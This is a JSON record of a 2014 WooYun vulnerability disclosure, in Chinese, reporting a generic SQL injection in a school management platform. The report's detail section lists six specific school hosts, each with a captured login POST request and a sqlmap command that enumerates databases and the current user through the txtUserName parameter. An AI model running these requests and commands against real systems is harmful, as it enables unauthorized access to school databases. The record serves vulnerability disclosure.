{"id": 1791, "wybug_id": "wooyun-2014-062255", "wybug_title": "某学校综合管理平台存在通用型SQL注入", "wybug_corp": "上海安脉计算机科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-28 17:07", "wybug_open_date": "2014-08-26 17:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向公众公开  简要描述： 某学校综合管理平台存在通用型SQL注入，涉及不少学校。 详细说明：  http://www.baidu.com/s?wd=%E6%8A%80%E6%9C%AF%E6%94%AF%E6%8C%81%EF%BC%9A56628124%2056626870漏洞应用开发商：上海安脉计算机科技有限公司 1、http://ps.imau.edu.cn/anmai/login.aspxa、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /anmai/getsession.asp HTTP/1.1Content-Length: 264Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=1rgrdf55yjvab055tdwcijft; ASPSESSIONIDACDCRQCD=MHOBLFNCCDJAKDACOOLMKBHFHost: ps.imau.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign%24signName=gveusgdw&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4CuTl2BgGJoc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n\n\n\n\n2、http://58.118.14.26/login.aspxa、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /getsession.asp HTTP/1.1Content-Length: 260Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=ggm1fu45mcjbu4jbjf1mhj55; ASPSESSIONIDAATQCTSD=PHFBHODDIJNFKGJHEFKGKIHGHost: 58.118.14.26Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign:signName=ltymqyff&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4CubaaXVHPqc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n\n\n3、http://www.wems.net:84/a、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /getsession.asp HTTP/1.1Content-Length: 264Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=x3ifu045a0hzti3k1deo1w45; ASPSESSIONIDQARDDDDQ=GEEFGBLDIGPBCCBANBFAJNGJHost: www.wems.net:84Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign:signName=vflbcavb&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4CutkFMIwfsc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n\n\n\n\n4、http://www.syzxyz.com:8008/login.aspxa、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /getsession.asp HTTP/1.1Content-Length: 264Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=ieh3jz55sqghif451v4pcvvn; ASPSESSIONIDSSRQAABR=GFMJIGIDKNAMDBOGONAKNHKI; %d5%d0%c9%fa%cd%b3%bc%c6=%d5%d0%c9%fa%cd%b3%bc%c6%7cRecruitstuManage%2frecruitstuStat%2fstudentState.aspx; %d1%a7%d0%a3%bc%f2%bd%e9=%d1%a7%d0%a3%bc%f2%bd%e9%7cRecruitstuManage%2fschoolinfo%2fschoolIntroduce.aspxHost: www.syzxyz.com:8008Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign%24signName=ylgpirky&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4Cu3JKPTkhuc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n\n\n5、http://218.2.69.105:8090/login.aspxa、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /getsession.asp HTTP/1.1Content-Length: 265Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=g0pfhk55ysesaz55qk1ohenu; ASPSESSIONIDSQDTSACR=NENLLMJDCDHLMCHNLIKMPKJHHost: 218.2.69.105:8090Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign%24signName=trkqqwxu&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4CuGrMiSVsmc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n\n\n\n\n6、http://218.21.35.220/login.aspxa、用WVS扫描，发现参数\"txtUserName\"存在post型SQL注入。\n\nb、将post请求保存2s.txt的文件。POST /getsession.asp HTTP/1.1Content-Length: 264Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=oad2w045cp2rtp550kmjeiah; ASPSESSIONIDQACDABTT=KGKDKDKDJCALIGLPLPOPOFLHHost: 218.21.35.220Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GetMiddleSign%24signName=lbonxbch&hidaction=login&password=g00dPa%24%24w0rD&txtUserName=4CunP7dPebRc、用SqlmapSqlmap py -r 2s.txt -p \"txtUserName\" --dbs --current-user --current-db\n\n   漏洞证明：  已证明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-06-01 23:35 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开渠道联系软件生产厂商上海安脉计算机科技有限公司通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-02 09:58 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  自古路人甲出真相。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}